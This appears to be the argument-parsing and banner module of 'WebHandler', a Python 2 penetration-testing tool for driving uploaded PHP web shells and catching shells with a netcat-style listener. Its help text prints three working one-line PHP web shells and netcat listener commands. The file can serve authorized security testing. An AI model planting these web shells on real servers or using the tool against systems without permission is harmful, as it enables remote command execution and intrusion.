from os import path, getcwd
from subprocess import Popen, PIPE
from sys import argv

import argparse


class Colors(object):
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    HOT = '\033[97m'
    END = '\033[0m'


class Banner(object):
    banner = ''
    current_commit = '???'
    if not path.exists(path.join(getcwd(), ".git")):
        banner = '\n{0}[!] "non-git". Keep up-to-date by running \'--update\'{1}'.format(Colors.RED, Colors.END)
    else:
        f = Popen('git rev-parse --short HEAD', shell=True, stdout=PIPE, stderr=PIPE)
        current_commit = f.communicate()[0]

    banner = banner + """{0}
\t\t__          __  _     _    _                 _ _
\t\t\ \        / / | |   | |  | |               | | |
\t\t \ \  /\  / /__| |__ | |__| | __ _ _ __   __| | | ___ _ __
\t\t  \ \/  \/ / _ \ '_ \|  __  |/ _` | '_ \ / _` | |/ _ \ '__|
\t\t   \  /\  /  __/ |_) | |  | | (_| | | | | (_| | |  __/ |
\t\t    \/  \/ \___|_.__/|_|  |_|\__,_|_| |_|\__,_|_|\___|_|
\t\t-----------------------------------------------------------
\t\t\t\t\t\t\t{3}{1}Version: {2}{3}""".format(Colors.YELLOW, Colors.GREEN, current_commit, Colors.END)


class GetArgs(object):
    if len(argv) <= 1:
        print'''
{hot}-- Hanlder for PHP system functions & alternative 'netcat listener' --

--   Which works for POST and GET requests:    --{end}
{yellow}1-   <?php system($_GET['parameter']); ?>
2-   <?php exec($_POST['parameter']); ?>
3-   <?php passthru($_REQUEST['parameter']); ?>{end}

{hot}--   Alternative 'netcat listener'    --{end}
{yellow}1-   netcat -l -p 1234
2-   nc -lvvp 4321{end}

Run: {red}{script} -h{end} for help'''.format(script=argv[0], hot=Colors.HOT, yellow=Colors.YELLOW, red=Colors.RED, end=Colors.END)
        exit(1)
    else:
        parser = argparse.ArgumentParser(
                add_help=False,
                usage='%(prog)s -h',
                formatter_class=argparse.RawTextHelpFormatter,
                epilog='''
Examples:
    python %(prog)s --url http://www.mywebsite.com/shell.php?cmd=
    python %(prog)s --url http://www.mywebsite.com/shell.php --method POST --parameter cmd
    python %(prog)s -u http://www.mywebsite.com/shell.php?cmd= --random-agent --turbo
    python %(prog)s -u http://www.mywebsite.com/shell.php?cmd= --proxy http://127.0.0.1:8080

    python %(prog)s --listen 1234
    python %(prog)s -l 4321''')
        optional = parser.add_argument_group('Optional arguments')
        optional.add_argument('-u', '--url', dest='url', help='\t\tFull URL for the uploaded PHP code', metavar='')
        optional.add_argument('-l', '--listen', dest='listen', help='\t\tListen for a connection', metavar='')
        optional.add_argument('-h', '--help', action='help', help='\t\tPrint this help message then exit')
        optional.add_argument('-c', '--turbo', dest='turbo', help='\t\tIncrease the execution speed if the out-put doesn\'t contain garbage', action='store_true')
        optional.add_argument('-m', '--method', dest='method', help='\t\tThe method used in the uploaded PHP code (e.g. post)', metavar='')
        optional.add_argument('-p', '--parameter', dest='parameter', help='\t\tParameter that used in the shell (e.g. cmd)', metavar='')
        optional.add_argument('-x', '--proxy', dest='proxy', help='\t\tProxy (e.g. \'http://127.0.0.1:8080\')', metavar='')
        optional.add_argument('-g', '--user-agent', dest='agent', help='\t\tuser-agent (e.g. \'Mozilla/5.0\')', metavar='')
        optional.add_argument('-rg', '--random-agent', dest='random_agent', help='\t\tWebHandler will use some random user-agent', action='store_true')
        optional.add_argument('-up', '--update', dest='update', help='\t\tUpdate webhandler from git cli "GitHub repo"', action='store_true')

        options = parser.parse_args()
        url = options.url
        listen = options.listen
        method = options.method.lower() if options.method else None
        parameter = options.parameter
        proxy = options.proxy
        agent = options.agent
        random_agent = options.random_agent
        turbo = options.turbo
        update = options.update
        
        if url:
            mode = "url"
        elif listen:
            mode = "listen"
        else:
            mode = "update"

        # URL might not be set (e.g. 'update'/'listen')
        if url:
            # Did they forget to add "http" infront?
            if not url.startswith('http'):
                url = "http://" + url

getargs = GetArgs()
banner = Banner().banner
